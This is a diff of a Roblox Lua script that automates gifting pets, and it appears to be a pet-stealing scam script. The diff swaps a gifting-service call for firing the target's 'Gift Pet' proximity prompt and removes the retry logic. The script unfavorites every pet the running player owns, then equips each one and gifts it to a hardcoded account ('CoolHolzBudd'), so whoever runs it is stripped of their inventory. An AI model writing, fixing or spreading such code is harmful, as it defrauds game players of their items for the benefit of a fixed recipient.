@@ -1,5 +1,5 @@
--- Pet Gifting Script with Retry Logic
--- Fixed version with proper unfavorite and retry systems
+-- Pet Gifting Script - Fixed version
+-- Fixed pet equipping and proximity prompt triggering
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -13,12 +13,11 @@ end
 wait(3)
 
 -- Import services safely
-local DataService, PetsService, PetGiftingService, TeleportUIController
+local DataService, PetsService, TeleportUIController
 local PetList, InventoryServiceEnums, FavoriteItemRemote
 
 pcall(function() DataService = require(ReplicatedStorage.Modules.DataService) end)
 pcall(function() PetsService = require(ReplicatedStorage.Modules.PetServices.PetsService) end)
-pcall(function() PetGiftingService = require(ReplicatedStorage.Modules.PetServices.PetGiftingService) end)
 pcall(function() TeleportUIController = require(ReplicatedStorage.Modules.TeleportUIController) end)
 pcall(function() PetList = require(ReplicatedStorage.Data.PetRegistry.PetList) end)
 pcall(function() InventoryServiceEnums = require(ReplicatedStorage.Data.EnumRegistry.InventoryServiceEnums) end)
@@ -28,8 +27,7 @@ pcall(function() FavoriteItemRemote = ReplicatedStorage:WaitForChild("GameEvents
 local Config = {
     TargetPlayerName = "CoolHolzBudd",
     DelayBetweenGifts = 3,
-    DebugMode = true,
-    MaxRetries = 3
+    DebugMode = true
 }
 
 -- State
@@ -56,7 +54,7 @@ local function GetPetInventory()
     return {}
 end
 
--- Pet Functions with Retry Logic
+-- Pet Functions
 local function UnfavoritePetInBackpack(petId)
     if not FavoriteItemRemote or not InventoryServiceEnums then
         Log("❌ Favorite system not available")
@@ -83,7 +81,7 @@ local function UnfavoritePetInBackpack(petId)
                     
                     if success then
                         Log("✅ Sent unfavorite request for: " .. tostring(tool.Name))
-                        wait(1.5) -- Wait for server processing
+                        wait(1.5)
                         return true
                     else
                         Log("❌ Failed to unfavorite: " .. tostring(error))
@@ -101,68 +99,46 @@ local function UnfavoritePetInBackpack(petId)
     return true
 end
 
-local function EquipPet(petId, maxRetries)
+local function EquipPet(petId)
     if not PetsService then 
         Log("❌ PetsService not available")
         return false 
     end
     
-    maxRetries = maxRetries or Config.MaxRetries
+    Log("⚙️ Equipping pet: " .. tostring(petId))
     
-    for attempt = 1, maxRetries do
-        Log("⚙️ Equip attempt " .. attempt .. "/" .. maxRetries .. " for pet: " .. tostring(petId))
-        
-        local success, error = pcall(function()
-            PetsService:EquipPet(petId, 1)
-        end)
-        
-        if success then
-            Log("✅ Equipped pet on attempt " .. attempt .. ": " .. tostring(petId))
-            return true
-        else
-            Log("❌ Equip attempt " .. attempt .. " failed: " .. tostring(error))
-            
-            if attempt < maxRetries then
-                Log("🔄 Retrying equip in 2 seconds...")
-                wait(2)
-            end
-        end
+    local success, error = pcall(function()
+        PetsService:EquipPet(petId, 1) -- Fixed: proper parameter order
+    end)
+    
+    if success then
+        Log("✅ Equipped pet: " .. tostring(petId))
+        return true
+    else
+        Log("❌ Failed to equip: " .. tostring(error))
+        return false
     end
-    
-    Log("❌ Failed to equip pet after " .. maxRetries .. " attempts: " .. tostring(petId))
-    return false
 end
 
-local function MakePetIntoTool(petId, maxRetries)
+local function MakePetIntoTool(petId)
     if not PetsService then 
         Log("❌ PetsService not available")
         return false 
     end
     
-    maxRetries = maxRetries or Config.MaxRetries
+    Log("🔧 Converting pet to tool: " .. tostring(petId))
     
-    for attempt = 1, maxRetries do
-        Log("🔧 Tool conversion attempt " .. attempt .. "/" .. maxRetries .. " for pet: " .. tostring(petId))
-        
-        local success, error = pcall(function()
-            PetsService:UnequipPet(petId)
-        end)
-        
-        if success then
-            Log("✅ Converted to tool on attempt " .. attempt .. ": " .. tostring(petId))
-            return true
-        else
-            Log("❌ Tool conversion attempt " .. attempt .. " failed: " .. tostring(error))
-            
-            if attempt < maxRetries then
-                Log("🔄 Retrying conversion in 1 second...")
-                wait(1)
-            end
-        end
+    local success, error = pcall(function()
+        PetsService:UnequipPet(petId)
+    end)
+    
+    if success then
+        Log("✅ Converted to tool: " .. tostring(petId))
+        return true
+    else
+        Log("❌ Failed to convert: " .. tostring(error))
+        return false
     end
-    
-    Log("❌ Failed to convert to tool after " .. maxRetries .. " attempts: " .. tostring(petId))
-    return false
 end
 
 local function WaitForPetTool(petId, maxWait)
@@ -174,30 +150,15 @@ local function WaitForPetTool(petId, maxWait)
     while waited < maxWait do
         local character = LocalPlayer.Character
         if character then
-            -- Debug: Show all tools in character
-            local toolsFound = {}
             for _, tool in pairs(character:GetChildren()) do
                 if tool:IsA("Tool") then
                     local toolPetUUID = tool:GetAttribute("PET_UUID")
                     local toolUUID = tool:GetAttribute("UUID")
                     
-                    table.insert(toolsFound, {
-                        Name = tool.Name,
-                        PET_UUID = toolPetUUID,
-                        UUID = toolUUID
-                    })
-                    
                     if toolPetUUID == petId or toolUUID == petId then
                         Log("✅ Found matching pet tool: " .. tostring(tool.Name))
                         return tool
                     end
-                end
-            end
-            
-            if #toolsFound > 0 then
-                Log("🔍 Tools in character:")
-                for _, tool in ipairs(toolsFound) do
-                    Log("  - " .. tostring(tool.Name) .. " (PET_UUID: " .. tostring(tool.PET_UUID) .. ", UUID: " .. tostring(tool.UUID) .. ")")
                 end
             end
         end
@@ -210,21 +171,44 @@ local function WaitForPetTool(petId, maxWait)
     return nil
 end
 
-local function GiftPet(targetPlayer)
-    if not PetGiftingService or not targetPlayer then 
-        Log("❌ Cannot gift - missing service or target")
+local function TriggerGiftPrompt(targetPlayer)
+    if not targetPlayer or not targetPlayer.Character then 
+        Log("❌ Cannot gift - missing target or character")
         return false 
     end
     
+    local character = LocalPlayer.Character
+    if not character then
+        Log("❌ No character found")
+        return false
+    end
+    
+    -- Find proximity prompt in workspace (it should be parented to target's character)
+    local proximityPrompt = nil
+    
+    -- Check target character and its descendants for proximity prompt
+    for _, child in pairs(targetPlayer.Character:GetDescendants()) do
+        if child:IsA("ProximityPrompt") and child.ActionText and child.ActionText:find("Gift Pet") then
+            proximityPrompt = child
+            break
+        end
+    end
+    
+    if not proximityPrompt then
+        Log("❌ No gift proximity prompt found on target")
+        return false
+    end
+    
+    Log("🎁 Triggering gift prompt...")
     local success, error = pcall(function()
-        PetGiftingService:GivePet(targetPlayer)
+        proximityPrompt:Trigger()
     end)
     
     if success then
-        Log("✅ Gift request sent to: " .. tostring(targetPlayer.Name))
+        Log("✅ Gift prompt triggered for: " .. tostring(targetPlayer.Name))
         return true
     else
-        Log("❌ Gift failed: " .. tostring(error))
+        Log("❌ Gift prompt failed: " .. tostring(error))
         return false
     end
 end
@@ -298,25 +282,25 @@ local function ProcessPetGifting(targetPlayer)
             continue
         end
         
-        -- Step 2: Equip pet (with retries)
+        -- Step 2: Equip pet
         Log("⚙️ Step 2: Equipping pet...")
         if EquipPet(pet.id) then
-            wait(2) -- Wait for equip to settle
+            wait(3)
             
-            -- Step 3: Convert to tool (with retries)
+            -- Step 3: Convert to tool  
             Log("🔧 Step 3: Converting to tool...")
             if MakePetIntoTool(pet.id) then
-                wait(1) -- Wait for conversion
+                wait(2)
                 
                 -- Step 4: Wait for tool and gift
                 Log("⏳ Step 4: Waiting for tool...")
                 local tool = WaitForPetTool(pet.id, 8)
                 if tool then
-                    Log("🎁 Step 5: Gifting pet...")
-                    if GiftPet(targetPlayer) then
+                    Log("🎁 Step 5: Triggering gift prompt...")
+                    if TriggerGiftPrompt(targetPlayer) then
                         giftedCount = giftedCount + 1
                         Log("🎉 Successfully gifted: " .. pet.name)
-                        wait(3) -- Wait to see if gift went through
+                        wait(3)
                         
                         -- Check if pet is gone from inventory
                         local currentInventory = GetPetInventory()
@@ -330,8 +314,6 @@ local function ProcessPetGifting(targetPlayer)
                     end
                 else
                     Log("❌ Tool not found for: " .. pet.name)
-                    -- Try to re-equip for next attempt
-                    pcall(function() EquipPet(pet.id) end)
                 end
             else
                 Log("❌ Failed to convert: " .. pet.name)
@@ -400,4 +382,4 @@ Players.PlayerAdded:Connect(function(player)
     end
 end)
 
-Log("🚀 Gifting automation loaded with retry system!")
+Log("🚀 Gifting automation loaded - single attempt per pet!")
